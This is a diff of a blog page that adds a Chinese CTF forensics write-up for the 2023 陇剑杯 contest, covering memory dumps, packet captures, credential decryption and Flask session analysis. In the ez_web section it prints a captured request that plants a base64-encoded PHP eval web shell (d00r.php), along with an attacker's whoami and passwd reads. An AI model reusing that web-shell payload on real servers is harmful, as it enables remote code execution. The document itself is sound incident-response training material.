@@ -659,7 +659,503 @@ substr函数的作用是截取字符串中指定长度的字符
 <pre><code>POOL=doge.millpools.cc:5567
 WALLET=DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9.lolMinerWorker
 </code></pre>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/2024/02/27/2023%E9%99%87%E5%89%91%E6%9D%AF/">http://w3nx1z1.github.io/2024/02/27/2023陇剑杯/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a><a class="post-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/29/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-6/" title="vulnhub靶场记录DC-6"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">vulnhub靶场记录DC-6</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/08/2023%E5%8F%A4%E5%89%91%E5%B1%B1/" title="2024古剑山"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2024古剑山</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E9%99%87%E5%89%91%E6%9D%AF%E5%88%9D%E8%B5%9B"><span class="toc-text">2023陇剑杯初赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-forensics"><span class="toc-text">baby_forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3"><span class="toc-text">3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-web"><span class="toc-text">ez_web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1"><span class="toc-text">3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hacked"><span class="toc-text">hacked</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2"><span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-text">4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hard-web"><span class="toc-text">hard_web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3"><span class="toc-text">1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-text">方法二：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3"><span class="toc-text">3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IncidentResponse"><span class="toc-text">IncidentResponse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4"><span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1"><span class="toc-text">4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5"><span class="toc-text">5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6"><span class="toc-text">6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7"><span class="toc-text">7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SmallSword"><span class="toc-text">SmallSword</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5"><span class="toc-text">3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcpdump"><span class="toc-text">tcpdump</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6"><span class="toc-text">1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-text">法二：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6"><span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2"><span class="toc-text">4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1"><span class="toc-text">5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wireshark"><span class="toc-text">wireshark</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-7"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7"><span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3"><span class="toc-text">4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#server-save"><span class="toc-text">server_save</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-8"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-8"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8"><span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4"><span class="toc-text">4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2"><span class="toc-text">5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1"><span class="toc-text">6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%818"><span class="toc-text">7、8</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-DailyBugle/" title="Offensive Pentesting-DailyBugle">Offensive Pentesting-DailyBugle</a><time datetime="2024-11-26T09:04:51.489Z" title="发表于 2024-11-26 17:04:51">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-GameZone/" title="Offensive Pentesting-GameZone">Offensive Pentesting-GameZone</a><time datetime="2024-11-26T09:04:48.797Z" title="发表于 2024-11-26 17:04:48">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-Kenobi/" title="Offensive Pentesting-Kenobi">Offensive Pentesting-Kenobi</a><time datetime="2024-11-26T09:04:45.988Z" title="发表于 2024-11-26 17:04:45">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-Skynet/" title="Offensive Pentesting-Skynet">Offensive Pentesting-Skynet</a><time datetime="2024-11-26T09:04:38.428Z" title="发表于 2024-11-26 17:04:38">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-Vulnversity/" title="Offensive Pentesting-Vulnversity">Offensive Pentesting-Vulnversity</a><time datetime="2024-11-26T09:04:30.499Z" title="发表于 2024-11-26 17:04:30">2024-11-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/2024/02/27/2023%E9%99%87%E5%89%91%E6%9D%AF/">http://w3nx1z1.github.io/2024/02/27/2023陇剑杯/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a><a class="post-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/29/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-6/" title="vulnhub靶场记录DC-6"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">vulnhub靶场记录DC-6</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/08/2023%E5%8F%A4%E5%89%91%E5%B1%B1/" title="2024古剑山"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2024古剑山</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><article class="post-content" id="article-container"><h1 id="2023陇剑杯初赛"><a href="#2023陇剑杯初赛" class="headerlink" title="2023陇剑杯初赛"></a>2023陇剑杯初赛</h1><pre><code>陇剑杯初赛的时候正好赶上我在带训 实在不好请假 遗憾错过流量分析杯 遂来复现一手
+</code></pre>
+<h2 id="baby-forensics"><a href="#baby-forensics" class="headerlink" title="baby_forensics"></a>baby_forensics</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040033023.png" alt="image-20240204003301941"></p>
+<p>要key  直接找关于key的文件</p>
+<pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 filescan | findstr &quot;key&quot;
+
+.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003df94070 -D E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a
+</code></pre>
+<p>导出来 重新命名为key.txt 内容是</p>
+<pre><code>E96&lt;6J:Da6g_b_f_gd75a3d4ch4heg4bab66ad5d     
+</code></pre>
+<p>估计还得在操作  随波逐流梭了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040052245.png" alt="image-20240204005247186"></p>
+<pre><code>thekeyis2e80307085fd2b5c49c968c323ee25d5
+</code></pre>
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040053671.png" alt="image-20240204005326608"></p>
+<p>要计算机就提取计算器的进程</p>
+<p>积累一下 计算器在计算机中的进程是<code>calc.exe</code></p>
+<pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 pslist
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040055638.png" alt="image-20240204005552594"></p>
+<p>导出来保存为data文件</p>
+<pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 memdump -p 2844 -D E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a
+</code></pre>
+<p>将1.data放到kali的gimp里面查看图像 需要调一下高度、宽度和偏移值</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040112762.png" alt="image-20240204011216677"></p>
+<p>得到计算器中的数字</p>
+<pre><code>7598632541
+</code></pre>
+<p>看wp还学到了一种做法 我们使用vol2的windows插件 并将其另存为<code>windows</code>文件</p>
+<pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 windows &gt;windows
+</code></pre>
+<p>在这个文件里面直接翻 计算器的进程<code>calc.exe</code> 直接找到计算器的运行结果</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402102309685.png" alt="image-20240210230950647"></p>
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272127039.png" alt="image-20240204120242491"></p>
+<p>在使用r-studio翻找关键文件的时候 在Music文件夹找到一个<code>i4ak3y</code>文件 打开查看内容 应该是一个解密密钥</p>
+<pre><code>qwerasdf
+</code></pre>
+<p>这道题我们需要用到计算机中便签的进程 也就是<code>StikyNot.exe</code></p>
+<pre><code>StikyNot.exe 是Windows操作系统中的一个应用程序，也就是桌面上的便签小工具。它的主要作用是提供一个简单的方式来创建、编辑和管理便签，以便用户可以在桌面上快速记录和查看重要的信息、提醒事项或备忘录。
+
+关于StikyNot.exe 的内存的作用，它主要用于存储和管理用户创建的便签内容。当用户打开StikyNot.exe 应用程序时，操作系统会为该程序分配一定的内存空间，用于存储便签的文本、颜色、位置等信息。这样，当用户关闭应用程序或重新启动计算机时，便签的内容仍然可以被保存下来，以便下次使用时能够恢复之前的状态。
+
+总结来说，StikyNot.exe 的内存的作用是为了存储和管理用户创建的便签内容，确保便签信息的持久性和可恢复性。
+</code></pre>
+<p>找到StikyNot.exe进程并将其提取出来 PID是2968</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111603493.png" alt="image-20240211160329431"></p>
+<pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 memdump -p 2968 -D E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a
+</code></pre>
+<p>将后缀改为data  使用gimp打开 调一下宽高</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111620937.png" alt="image-20240211162030868"></p>
+<p>看到一串字符</p>
+<pre><code>U2FsdGVkX195MCsw0ANs6/Vkjibq89YlmnDdY/dCNKRkixvAP6+B5ImXr2VIqBSp94qfIcjQhDxPgr9G4u++pA==
+</code></pre>
+<p>看到<code>U2Fsd</code>的头 想到很多使用对称加密在线网站的结果都有这个头 在结合上面找到的密码 直接进行解密</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111652856.png" alt="image-20240211165231813"></p>
+<p>也可以直接在内存文件里面翻 有<code>U2Fsd</code>头的内容进行解密 但是多少还是有点草率</p>
+<p>也可以写个check函数帮助筛选内存文件中可能是flag的内容 参考下面文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Ahi0upsec/article/details/132549714?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170757131916800184120961%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170757131916800184120961&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-132549714-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=2023%E9%99%87%E5%89%91%E6%9D%AF&spm=1018.2226.3001.4187">2023陇剑杯wp</a></p>
+<pre><code class="bash">#!/bin/bash
+
+check() &#123;
+    pattern=&quot;flag|==|10210897103|666c6167|464C4147|Zmxh|Wm14aFoz|&amp;#102|58s4vb|2uk2h3|key|pass|pwd|password|hint|U2FsdGVkX1&quot;
+    &gt; check.txt  # 清空或创建 check.txt 文件
+    grep -irlE &quot;$pattern&quot; 1.raw | while read -r file; do
+        echo -e &quot;File: $file&quot; &gt;&gt; check.txt
+        strings &quot;$file&quot; | grep -iE &quot;$pattern&quot; &gt;&gt; check.txt
+        echo -e &quot;&quot; &gt;&gt; check.txt
+    done
+&#125;
+
+check  # 调用 check 函数
+
+echo &quot;检查完成，请查看 check.txt 文件&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111713412.png" alt="image-20240211171337367"></p>
+<h2 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111716058.png" alt="image-20240211171631986"></p>
+<p>看了一下分组计数器 4xx很多 说明还是存在目录扫描的 我的思路还是先从响应码200的请求包开始找  先筛选一下</p>
+<pre><code>http.response.code == 200
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111753613.png" alt="image-20240211175345527"></p>
+<p>不是很多 从上到下翻找一下 第三个包找到了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111758514.png" alt="image-20240211175852466"></p>
+<pre><code>a=file_put_contents%28%27d00r.php%27%2C+base64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs%2FPg%3D%3D%27%29%29%3B
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111759380.png" alt="image-20240211175932288"></p>
+<p>到这可能觉得<code>d00r.php</code>就是正确答案了 但是在比赛的时候提交是不正确的 那就在往上一级找一下  那就是<code>ViewMore.php</code></p>
+<h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111801971.png" alt="image-20240211180120905"></p>
+<p>在上一题后面继续往后翻 看到使用了ifconfig命令  这个包是第10098流</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402120009624.png" alt="image-20240212000917581"></p>
+<p>在追踪一下http流 看一下获取ip地址的结果</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122241297.png" alt="image-20240212224132249"></p>
+<p>上面的192.168.160.130是已经出现的 那下面的192.168.160.132就是服务器ip了</p>
+<pre><code>192.168.160.132
+</code></pre>
+<h3 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111805362.png" alt="image-20240211180507299"></p>
+<p>还是一样在http流里面看 先看到读取了passwd文件的内容 <code>7e03864b0db7e6f9</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122309057.png" alt="image-20240212230949011"></p>
+<p>还找到写入了一个base64编码的文件</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122159971.png" alt="image-20240212215923913"></p>
+<p>是个压缩包</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122317638.png" alt="image-20240212231726573"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272127100.png" alt="image-20240212231740914"></p>
+<p>将压缩包保存下来  尝试使用上面读取的密码解压 得到key.txt</p>
+<pre><code>7d9ddff2-2d67-4eba-9e48-b91c26c42337
+</code></pre>
+<h2 id="hacked"><a href="#hacked" class="headerlink" title="hacked"></a>hacked</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272127575.png" alt="image-20240212232426112"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132329684.png" alt="image-20240213232909590"></p>
+<p> 追踪register页面可以找到加密算法</p>
+<pre><code class="javascript">  &lt;script language=&quot;javascript&quot;&gt;  
+  crypt_key = &#39;l36DoqKUYQP0N7e1&#39;;
+  crypt_iv = &#39;131b0c8a7a6e072e&#39;;
+  var key = CryptoJS.enc.Utf8.parse(crypt_key); 
+  var iv = CryptoJS.enc.Utf8.parse(crypt_iv); 
+  function Encrypt(word)&#123;
+    srcs = CryptoJS.enc.Utf8.parse(word);
+    var encrypted = CryptoJS.AES.encrypt(srcs, key, &#123; iv: iv,mode:CryptoJS.mode.CBC,padding: CryptoJS.pad.Pkcs7&#125;);
+    return encrypted.toString();
+  &#125;
+  function print()&#123;
+    var a = Encrypt(myform.username.value);
+    var b = Encrypt(myform.password.value);
+    &#125;
+</code></pre>
+<p>写个解密脚本</p>
+<pre><code class="python">from Crypto.Cipher import AES
+import base64
+
+crypt_key = b&#39;l36DoqKUYQP0N7e1&#39;
+crypt_iv = b&#39;131b0c8a7a6e072e&#39;
+
+def decrypt(ciphertext):
+    cipher = AES.new(crypt_key, AES.MODE_CBC, crypt_iv)
+    decrypted = cipher.decrypt(base64.b64decode(ciphertext))
+    # 移除 PKCS7 填充
+    decrypted = _remove_pkcs7_padding(decrypted)
+    return decrypted.decode(&#39;utf-8&#39;)
+
+def _remove_pkcs7_padding(data):
+    padding_len = data[-1]
+    return data[:-padding_len]
+
+# 解密用户名和密码
+encrypted_username = &quot;pl3HJGsgs1Zn43qjV5Qx8w==&quot;
+decrypted_username = decrypt(encrypted_username)
+print(&#39;Decrypted Username:&#39;, decrypted_username)
+
+encrypted_password = &quot;pl3HJGsgs1Zn43qjV5Qx8w==&quot;
+decrypted_password = decrypt(encrypted_password)
+print(&#39;Decrypted Password:&#39;, decrypted_password)
+</code></pre>
+<p>用上面这组用户名和密码 解出来为<code>aaa/aaa</code> 我们同样追踪register页面 找到admIn的那一组就好</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132345081.png" alt="image-20240213234532033"></p>
+<pre><code>flag&#123;WelC0m5_TO_H3re&#125;
+</code></pre>
+<h3 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132333038.png" alt="image-20240213233302974"></p>
+<p>第68个流看到一串很奇妙的字符 直接搜索SECRET_KEY </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132347439.png" alt="image-20240213234748388"></p>
+<p>解码一下</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132347671.png" alt="image-20240213234759606"></p>
+<pre><code>ssti_flask_hsfvaldb
+</code></pre>
+<h3 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132348796.png" alt="image-20240213234820734"></p>
+<p>是flask的session注入漏洞 需要用到<code>flask-session-cookie-manager</code>这个工具来解密session</p>
+<p>用法就是</p>
+<pre><code>python3 ./flask_session_cookie_manager.py -c cookie密文 -s 密钥
+</code></pre>
+<p>然后在流量包里面解密session值就可以了 密钥就是上面第二题<code>ssti_flask_hsfvaldb</code></p>
+<p>我们直接看回显 像这种正常在页面上回显的基本上没有什么问题</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182049988.png"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182050900.png"></p>
+<p>直接找有问题的 一个没有回显 一个回显None</p>
+<p>![(<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/w3n1z1/blogimage/main/image/202402182139955.png">https://raw.githubusercontent.com/w3n1z1/blogimage/main/image/202402182139955.png</a>)</p>
+<p>求包看到了执行了whoami命令 返回包看到用户是red</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182140952.png" alt="image-20240218214056815"></p>
+<p>因此 flask网站是由<code>red</code>用户启动的</p>
+<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182141484.png" alt="image-20240218214151413"></p>
+<p>一共就那么几个路由 都试试就出了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182149897.png" alt="image-20240218214937822"></p>
+<pre><code>Index
+</code></pre>
